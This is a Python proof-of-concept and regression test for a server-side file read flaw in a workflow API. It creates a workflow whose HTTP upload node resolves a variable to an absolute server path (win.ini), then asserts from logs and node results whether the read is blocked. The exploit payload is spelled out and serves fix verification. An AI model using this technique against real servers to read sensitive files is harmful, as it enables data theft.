"""PoC #2: Server-Side File Read via HTTP node file_uploads — regression assertion.

After fix: file_uploads with type=variable resolving to an absolute path must be
blocked.  The run log must NOT contain "Resolved variable as file path" for the
evil path, and the node result must be an error.
Before fix: the file is read and attached to the request.

Usage:
    python poc_file_read.py --expected=blocked     # default: assert file read blocked
    python poc_file_read.py --expected=vulnerable  # assert file read still works
"""

import argparse
import json
import os
import sys
import time
import urllib.request

SESSION = os.environ.get("APIWEAVE_SESSION")
CSRF = os.environ.get("APIWEAVE_CSRF")


def req(base, method, path, body=None):
    url = base + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Cookie", f"session={SESSION}; csrftoken={CSRF}")
    r.add_header("Content-Type", "application/json")
    if method in ("POST", "PUT", "PATCH", "DELETE"):
        r.add_header("X-CSRF-Token", CSRF)
    try:
        resp = urllib.request.urlopen(r, timeout=15)
        return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"null")
    except Exception as e:
        return 0, {"error": str(e)}


def main():
    parser = argparse.ArgumentParser(description="File read PoC regression assertion")
    parser.add_argument(
        "--expected",
        choices=["blocked", "vulnerable"],
        default="blocked",
        help="Expected outcome: 'blocked' (post-fix) or 'vulnerable' (pre-fix)",
    )
    parser.add_argument(
        "--base-url",
        default=os.environ.get("APIWEAVE_BASE_URL", "http://127.0.0.1:8000"),
        help="Backend base URL (default: $APIWEAVE_BASE_URL or http://127.0.0.1:8000)",
    )
    args = parser.parse_args()
    BASE = args.base_url.rstrip("/")
    expected = args.expected

    if not SESSION or not CSRF:
        print("SKIP: Set APIWEAVE_SESSION and APIWEAVE_CSRF env vars")
        sys.exit(0)

    # Strategy: use file upload with a "variable" ref that resolves to a path.
    target_file = "C:/Windows/win.ini"

    print(f"[*] Expected outcome: {expected}")
    print(f"[*] Target file: {target_file}")

    wf = {
        "name": "File Read PoC - audit",
        "variables": {"evilpath": target_file},
        "nodes": [
            {
                "nodeId": "s",
                "type": "start",
                "label": "Start",
                "position": {"x": 0, "y": 0},
                "config": {},
            },
            {
                "nodeId": "h",
                "type": "http-request",
                "label": "Upload",
                "position": {"x": 100, "y": 0},
                "config": {
                    "method": "POST",
                    "url": f"{BASE}/health",
                    "headers": "",
                    "body": "",
                    "bodyType": None,
                    "timeout": 10,
                    "fileUploads": [
                        {
                            "active": True,
                            "type": "variable",
                            "value": "{{variables.evilpath}}",
                            "fieldName": "evilfile",
                            "mimeType": "application/octet-stream",
                        }
                    ],
                },
            },
            {
                "nodeId": "e",
                "type": "end",
                "label": "End",
                "position": {"x": 200, "y": 0},
                "config": {},
            },
        ],
        "edges": [
            {"edgeId": "e1", "source": "s", "target": "h"},
            {"edgeId": "e2", "source": "h", "target": "e"},
        ],
    }
    code, w = req(BASE, "POST", "/api/workflows", wf)
    print(f"[{'+'if code in (200,201) else '!'}] create workflow: HTTP {code}")
    if code not in (200, 201):
        print(json.dumps(w, indent=2))
        sys.exit(2)
    wid = w["workflowId"]
    code, run = req(BASE, "POST", f"/api/workflows/{wid}/run", {})
    print(f"[{'+'if code in (200,202) else '!'}] trigger: HTTP {code}")
    rid = run.get("runId")
    if code not in (200, 202):
        print(f"FAIL: trigger run: HTTP {code} {run}")
        sys.exit(3)

    for _ in range(30):
        time.sleep(0.5)
        code, status = req(BASE, "GET", f"/api/workflows/{wid}/runs/{rid}")
        if status.get("status") in ("completed", "failed"):
            break
    print(f"[*] Run status: {status.get('status')}")

    # Check the run log
    log_text = ""
    log_path = f"logs/run_{rid}.log"
    if os.path.exists(log_path):
        print(f"\n[*] Run log {log_path}:")
        with open(log_path, encoding="utf-8") as f:
            log_text = f.read()
        for keyword in [
            "win.ini",
            "evilpath",
            "Resolved variable as file path",
            "Failed to resolve",
            "Path traversal",
            "Error",
            "blocked",
            "forbidden",
            "disallowed",
        ]:
            if keyword in log_text:
                start = max(0, log_text.find(keyword) - 100)
                end = min(len(log_text), log_text.find(keyword) + 300)
                print(f"  -- context around '{keyword}': --")
                print("  " + log_text[start:end].replace("\n", "\n  "))
                print()
    else:
        print(f"Log file not found: {log_path}")

    code, res = req(BASE, "GET", f"/api/workflows/{wid}/runs/{rid}/nodes/h/result")
    result_data = res.get("result", res) if isinstance(res, dict) else res
    print("[*] Node result:")
    print(json.dumps(result_data, indent=2)[:1500])

    req(BASE, "DELETE", f"/api/workflows/{wid}")

    # --- Assertions ---
    results = []  # (test_name, passed, detail)

    result_status = result_data.get("status", "") if isinstance(result_data, dict) else ""
    result_error = str(result_data.get("error", "")) if isinstance(result_data, dict) else ""

    # Check for file-read blocking indicators
    block_indicators_log = [
        "blocked",
        "forbidden",
        "not allowed",
        "disallowed",
        "path traversal",
        "unsafe path",
        "invalid path",
        "file read denied",
        "access denied",
    ]
    log_has_block = any(kw in log_text.lower() for kw in block_indicators_log)

    # Check if file was resolved (vulnerable indicator)
    log_has_resolved = "Resolved variable as file path" in log_text and "win.ini" in log_text

    # Check result error for blocking
    result_has_block_error = any(kw in result_error.lower() for kw in block_indicators_log)
    result_is_error = result_status == "error"

    if expected == "blocked":
        # PASS if: log shows blocking OR result is error OR file was NOT resolved
        file_blocked = (
            log_has_block or result_has_block_error or result_is_error or not log_has_resolved
        )
        if file_blocked:
            detail = (
                f"log_has_block={log_has_block}, result_is_error={result_is_error}, "
                f"log_has_resolved={log_has_resolved}"
            )
            if result_error:
                detail += f", error={result_error[:120]}"
            results.append(("File read blocked", True, detail))
        else:
            results.append(
                (
                    "File read blocked",
                    False,
                    "File read NOT blocked — log shows resolved path and no blocking error",
                )
            )
    else:  # vulnerable
        # PASS if: log shows the file was resolved (file was read)
        if log_has_resolved:
            results.append(
                (
                    "File read vulnerable (file was read)",
                    True,
                    "Log contains 'Resolved variable as file path' with win.ini — file read confirmed",
                )
            )
        else:
            results.append(
                (
                    "File read vulnerable (file was read)",
                    False,
                    "Expected log to show resolved file path but it did not — file read may be blocked",
                )
            )

    # --- Report ---
    print("\n" + "=" * 60)
    print("ASSERTION RESULTS")
    print("=" * 60)
    all_pass = True
    for name, passed, detail in results:
        tag = "PASS" if passed else "FAIL"
        if not passed:
            all_pass = False
        print(f"  [{tag}] {name}")
        print(f"         {detail}")

    # Save evidence
    evidence_path = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        ".omo",
        "evidence",
        "task-6-poc-file-read.txt",
    )
    try:
        os.makedirs(os.path.dirname(evidence_path), exist_ok=True)
        with open(evidence_path, "w", encoding="utf-8") as f:
            f.write(
                f"poc_file_read.py — expected={expected}\nbase_url={BASE}\ntarget_file={target_file}\n\n"
            )
            f.write(f"Log text (first 4000 chars):\n{log_text[:4000]}\n\n")
            f.write(f"Node result:\n{json.dumps(result_data, indent=2)[:2000]}\n\n")
            f.write("Assertions:\n")
            for name, passed, detail in results:
                f.write(f"  [{'PASS' if passed else 'FAIL'}] {name}: {detail}\n")
            f.write(f"\nOverall: {'PASS' if all_pass else 'FAIL'}\n")
        print(f"\n[*] Evidence saved to {evidence_path}")
    except Exception as e:
        print(f"[!] Could not save evidence: {e}")

    sys.exit(0 if all_pass else 1)


if __name__ == "__main__":
    main()
